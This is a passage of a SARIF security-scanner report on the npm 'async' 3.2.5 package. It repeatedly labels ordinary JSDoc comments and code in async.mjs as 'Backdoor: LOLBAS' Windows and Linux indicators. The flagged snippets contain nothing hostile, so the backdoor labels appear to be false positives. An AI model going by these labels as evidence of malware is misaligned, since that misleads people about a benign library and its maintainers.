                  "startColumn": 12,
                  "endLine": 1794,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @method\n * @see [async.queue]{@link module:ControlFlow.queue}\n * @see [async.cargo]{@link module:ControlFLow.cargo}\n * @category Control Flow\n * @param {AsyncFunction} worker - An asynchronous function for processing an array\n * of queued tasks. Invoked with `(tasks, callback)`.\n * @param {number} [concurrency=1] - An `integer` for determining how many\n",
                    "rendered": {
                      "text": " * @method\n * @see [async.queue]{@link module:ControlFlow.queue}\n * @see [async.cargo]{@link module:ControlFLow.cargo}\n * @category Control Flow\n * @param {AsyncFunction} worker - An asynchronous function for processing an array\n * of queued tasks. Invoked with `(tasks, callback)`.\n * @param {number} [concurrency=1] - An `integer` for determining how many\n",
                      "markdown": "` * @method\n * @see [async.queue]{@link module:ControlFlow.queue}\n * @see [async.cargo]{@link module:ControlFLow.cargo}\n * @category Control Flow\n * @param {AsyncFunction} worker - An asynchronous function for processing an array\n * of queued tasks. Invoked with `(tasks, callback)`.\n * @param {number} [concurrency=1] - An `integer` for determining how many\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1785,
                  "startColumn": 2,
                  "endLine": 1785,
                  "endColumn": 6,
                  "snippet": {
                    "text": " * for how `cargo` and `queue` work.\n *\n * While [`queue`]{@link module:ControlFlow.queue} passes only one task to one of a group of workers\n * at a time, and [`cargo`]{@link module:ControlFlow.cargo} passes an array of tasks to a single worker,\n * the cargoQueue passes an array of tasks to multiple parallel workers.\n *\n * @name cargoQueue\n",
                    "rendered": {
                      "text": " * for how `cargo` and `queue` work.\n *\n * While [`queue`]{@link module:ControlFlow.queue} passes only one task to one of a group of workers\n * at a time, and [`cargo`]{@link module:ControlFlow.cargo} passes an array of tasks to a single worker,\n * the cargoQueue passes an array of tasks to multiple parallel workers.\n *\n * @name cargoQueue\n",
                      "markdown": "` * for how `cargo` and `queue` work.\n *\n * While [`queue`]{@link module:ControlFlow.queue} passes only one task to one of a group of workers\n * at a time, and [`cargo`]{@link module:ControlFlow.cargo} passes an array of tasks to a single worker,\n * the cargoQueue passes an array of tasks to multiple parallel workers.\n *\n * @name cargoQueue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1743,
                  "startColumn": 12,
                  "endLine": 1743,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.queue]{@link module:ControlFlow.queue}\n * @category Control Flow\n * @param {AsyncFunction} worker - An asynchronous function for processing an array\n * of queued tasks. Invoked with `(tasks, callback)`.\n * @param {number} [payload=Infinity] - An optional `integer` for determining\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.queue]{@link module:ControlFlow.queue}\n * @category Control Flow\n * @param {AsyncFunction} worker - An asynchronous function for processing an array\n * of queued tasks. Invoked with `(tasks, callback)`.\n * @param {number} [payload=Infinity] - An optional `integer` for determining\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.queue]{@link module:ControlFlow.queue}\n * @category Control Flow\n * @param {AsyncFunction} worker - An asynchronous function for processing an array\n * of queued tasks. Invoked with `(tasks, callback)`.\n * @param {number} [payload=Infinity] - An optional `integer` for determining\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1735,
                  "startColumn": 2,
                  "endLine": 1735,
                  "endColumn": 6,
                  "snippet": {
                    "text": " * for how `cargo` and `queue` work.\n *\n * While [`queue`]{@link module:ControlFlow.queue} passes only one task to one of a group of workers\n * at a time, cargo passes an array of tasks to a single worker, repeating\n * when the worker is finished.\n *\n * @name cargo\n",
                    "rendered": {
                      "text": " * for how `cargo` and `queue` work.\n *\n * While [`queue`]{@link module:ControlFlow.queue} passes only one task to one of a group of workers\n * at a time, cargo passes an array of tasks to a single worker, repeating\n * when the worker is finished.\n *\n * @name cargo\n",
                      "markdown": "` * for how `cargo` and `queue` work.\n *\n * While [`queue`]{@link module:ControlFlow.queue} passes only one task to one of a group of workers\n * at a time, cargo passes an array of tasks to a single worker, repeating\n * when the worker is finished.\n *\n * @name cargo\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1281,
                  "startColumn": 25,
                  "endLine": 1281,
                  "endColumn": 29,
                  "snippet": {
                    "text": " *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: function(get_data, make_folder, callback) {\n",
                    "rendered": {
                      "text": " *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: function(get_data, make_folder, callback) {\n",
                      "markdown": "` *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: function(get_data, make_folder, callback) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1256,
                  "startColumn": 12,
                  "endLine": 1256,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.auto]{@link module:ControlFlow.auto}\n * @category Control Flow\n * @param {Object} tasks - An object, each of whose properties is an {@link AsyncFunction} of\n * the form 'func([dependencies...], callback). The object's key of a property\n * serves as the name of the task defined by that property, i.e. can be used\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.auto]{@link module:ControlFlow.auto}\n * @category Control Flow\n * @param {Object} tasks - An object, each of whose properties is an {@link AsyncFunction} of\n * the form 'func([dependencies...], callback). The object's key of a property\n * serves as the name of the task defined by that property, i.e. can be used\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.auto]{@link module:ControlFlow.auto}\n * @category Control Flow\n * @param {Object} tasks - An object, each of whose properties is an {@link AsyncFunction} of\n * the form 'func([dependencies...], callback). The object's key of a property\n * serves as the name of the task defined by that property, i.e. can be used\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 993,
                  "startColumn": 33,
                  "endLine": 993,
                  "endColumn": 37,
                  "snippet": {
                    "text": " *             },\n *             make_folder: function(callback) {\n *                 // async code to create a directory to store a file in\n *                 // this is run at the same time as getting the data\n *                 callback(null, 'folder');\n *             },\n *             write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                    "rendered": {
                      "text": " *             },\n *             make_folder: function(callback) {\n *                 // async code to create a directory to store a file in\n *                 // this is run at the same time as getting the data\n *                 callback(null, 'folder');\n *             },\n *             write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                      "markdown": "` *             },\n *             make_folder: function(callback) {\n *                 // async code to create a directory to store a file in\n *                 // this is run at the same time as getting the data\n *                 callback(null, 'folder');\n *             },\n *             write_file: ['get_data', 'make_folder', function(results, callback) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 959,
                  "startColumn": 25,
                  "endLine": 959,
                  "endColumn": 29,
                  "snippet": {
                    "text": " *     make_folder: function(callback) {\n *         console.log('in make_folder');\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                    "rendered": {
                      "text": " *     make_folder: function(callback) {\n *         console.log('in make_folder');\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                      "markdown": "` *     make_folder: function(callback) {\n *         console.log('in make_folder');\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 924,
                  "startColumn": 25,
                  "endLine": 924,
                  "endColumn": 29,
                  "snippet": {
                    "text": " *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                    "rendered": {
                      "text": " *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                      "markdown": "` *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 894,
                  "startColumn": 12,
                  "endLine": 894,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Object} tasks - An object. Each of its properties is either a\n * function or an array of requirements, with the {@link AsyncFunction} itself the last item\n * in the array. The object's key of a property serves as the name of the task\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Object} tasks - An object. Each of its properties is either a\n * function or an array of requirements, with the {@link AsyncFunction} itself the last item\n * in the array. The object's key of a property serves as the name of the task\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Object} tasks - An object. Each of its properties is either a\n * function or an array of requirements, with the {@link AsyncFunction} itself the last item\n * in the array. The object's key of a property serves as the name of the task\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 845,
                  "startColumn": 12,
                  "endLine": 845,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.applyEach]{@link module:ControlFlow.applyEach}\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} fns - A collection of {@link AsyncFunction}s to all\n * call with the same arguments\n * @param {...*} [args] - any number of separate arguments to pass to the\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.applyEach]{@link module:ControlFlow.applyEach}\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} fns - A collection of {@link AsyncFunction}s to all\n * call with the same arguments\n * @param {...*} [args] - any number of separate arguments to pass to the\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.applyEach]{@link module:ControlFlow.applyEach}\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} fns - A collection of {@link AsyncFunction}s to all\n * call with the same arguments\n * @param {...*} [args] - any number of separate arguments to pass to the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 838,
                  "startColumn": 103,
                  "endLine": 838,
                  "endColumn": 107,
                  "snippet": {
                    "text": "var mapSeries$1 = awaitify(mapSeries, 3);\n\n/**\n * The same as [`applyEach`]{@link module:ControlFlow.applyEach} but runs only a single async operation at a time.\n *\n * @name applyEachSeries\n * @static\n",
                    "rendered": {
                      "text": "var mapSeries$1 = awaitify(mapSeries, 3);\n\n/**\n * The same as [`applyEach`]{@link module:ControlFlow.applyEach} but runs only a single async operation at a time.\n *\n * @name applyEachSeries\n * @static\n",
                      "markdown": "`var mapSeries$1 = awaitify(mapSeries, 3);\n\n/**\n * The same as [`applyEach`]{@link module:ControlFlow.applyEach} but runs only a single async operation at a time.\n *\n * @name applyEachSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 814,
                  "startColumn": 91,
                  "endLine": 814,
                  "endColumn": 95,
                  "snippet": {
                    "text": "var eachOfSeries$1 = awaitify(eachOfSeries, 3);\n\n/**\n * The same as [`map`]{@link module:Collections.map} but runs only a single async operation at a time.\n *\n * @name mapSeries\n * @static\n",
                    "rendered": {
                      "text": "var eachOfSeries$1 = awaitify(eachOfSeries, 3);\n\n/**\n * The same as [`map`]{@link module:Collections.map} but runs only a single async operation at a time.\n *\n * @name mapSeries\n * @static\n",
                      "markdown": "`var eachOfSeries$1 = awaitify(eachOfSeries, 3);\n\n/**\n * The same as [`map`]{@link module:Collections.map} but runs only a single async operation at a time.\n *\n * @name mapSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 791,
                  "startColumn": 97,
                  "endLine": 791,
                  "endColumn": 101,
                  "snippet": {
                    "text": "var applyEach = applyEach$1(map$1);\n\n/**\n * The same as [`eachOf`]{@link module:Collections.eachOf} but runs only a single async operation at a time.\n *\n * @name eachOfSeries\n * @static\n",
                    "rendered": {
                      "text": "var applyEach = applyEach$1(map$1);\n\n/**\n * The same as [`eachOf`]{@link module:Collections.eachOf} but runs only a single async operation at a time.\n *\n * @name eachOfSeries\n * @static\n",
                      "markdown": "`var applyEach = applyEach$1(map$1);\n\n/**\n * The same as [`eachOf`]{@link module:Collections.eachOf} but runs only a single async operation at a time.\n *\n * @name eachOfSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 762,
                  "startColumn": 12,
                  "endLine": 762,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} fns - A collection of {@link AsyncFunction}s\n * to all call with the same arguments\n * @param {...*} [args] - any number of separate arguments to pass to the\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} fns - A collection of {@link AsyncFunction}s\n * to all call with the same arguments\n * @param {...*} [args] - any number of separate arguments to pass to the\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} fns - A collection of {@link AsyncFunction}s\n * to all call with the same arguments\n * @param {...*} [args] - any number of separate arguments to pass to the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 463,
                  "startColumn": 65,
                  "endLine": 463,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @alias forEachOfLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each\n * item in `coll`. The `key` is the item's key, or index in the case of an\n * array.\n",
                    "rendered": {
                      "text": " * @alias forEachOfLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each\n * item in `coll`. The `key` is the item's key, or index in the case of an\n * array.\n",
                      "markdown": "` * @alias forEachOfLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each\n * item in `coll`. The `key` is the item's key, or index in the case of an\n * array.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 452,
                  "startColumn": 105,
                  "endLine": 452,
                  "endColumn": 109,
                  "snippet": {
                    "text": "};\n\n/**\n * The same as [`eachOf`]{@link module:Collections.eachOf} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name eachOfLimit\n",
                    "rendered": {
                      "text": "};\n\n/**\n * The same as [`eachOf`]{@link module:Collections.eachOf} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name eachOfLimit\n",
                      "markdown": "`};\n\n/**\n * The same as [`eachOf`]{@link module:Collections.eachOf} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name eachOfLimit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 49,
                  "endLine": 4,
                  "endColumn": 58,
                  "snippet": {
                    "text": "/**\n * Creates a continuation function with some arguments already applied.\n *\n * Useful as a shorthand when combined with other control flow functions. Any\n * arguments passed to the returned function are added to the arguments\n * originally passed to apply.\n *\n",
                    "rendered": {
                      "text": "/**\n * Creates a continuation function with some arguments already applied.\n *\n * Useful as a shorthand when combined with other control flow functions. Any\n * arguments passed to the returned function are added to the arguments\n * originally passed to apply.\n *\n",
                      "markdown": "`/**\n * Creates a continuation function with some arguments already applied.\n *\n * Useful as a shorthand when combined with other control flow functions. Any\n * arguments passed to the returned function are added to the arguments\n * originally passed to apply.\n *\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5830,
                  "startColumn": 8,
                  "endLine": 5830,
                  "endColumn": 14,
                  "snippet": {
                    "text": " * Note, due to JavaScript limitations, we can only detect native `async`\n * functions and not transpilied implementations.\n * Your environment must have `async`/`await` support for this to work.\n * (e.g. Node > v7.6, or a recent version of a modern browser).\n * If you are using `async` functions through a transpiler (e.g. Babel), you\n * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n * because the `async function` will be compiled to an ordinary function that\n",
                    "rendered": {
                      "text": " * Note, due to JavaScript limitations, we can only detect native `async`\n * functions and not transpilied implementations.\n * Your environment must have `async`/`await` support for this to work.\n * (e.g. Node > v7.6, or a recent version of a modern browser).\n * If you are using `async` functions through a transpiler (e.g. Babel), you\n * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n * because the `async function` will be compiled to an ordinary function that\n",
                      "markdown": "` * Note, due to JavaScript limitations, we can only detect native `async`\n * functions and not transpilied implementations.\n * Your environment must have `async`/`await` support for this to work.\n * (e.g. Node > v7.6, or a recent version of a modern browser).\n * If you are using `async` functions through a transpiler (e.g. Babel), you\n * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n * because the `async function` will be compiled to an ordinary function that\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5691,
                  "startColumn": 75,
                  "endLine": 5692,
                  "snippet": {
                    "text": " * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` fails. Invoked with (callback).\n * @param {Function} [callback] - A callback which is called after the test\n * function has passed and repeated execution of `iteratee` has stopped. `callback`\n * will be passed an error and any arguments passed to the final `iteratee`'s\n",
                    "rendered": {
                      "text": " * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` fails. Invoked with (callback).\n * @param {Function} [callback] - A callback which is called after the test\n * function has passed and repeated execution of `iteratee` has stopped. `callback`\n * will be passed an error and any arguments passed to the final `iteratee`'s\n",
                      "markdown": "` * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` fails. Invoked with (callback).\n * @param {Function} [callback] - A callback which is called after the test\n * function has passed and repeated execution of `iteratee` has stopped. `callback`\n * will be passed an error and any arguments passed to the final `iteratee`'s\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5629,
                  "startColumn": 75,
                  "endLine": 5630,
                  "snippet": {
                    "text": " * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` passes. Invoked with (callback).\n * @param {Function} [callback] - A callback which is called after the test\n * function has failed and repeated execution of `iteratee` has stopped. `callback`\n * will be passed an error and any arguments passed to the final `iteratee`'s\n",
                    "rendered": {
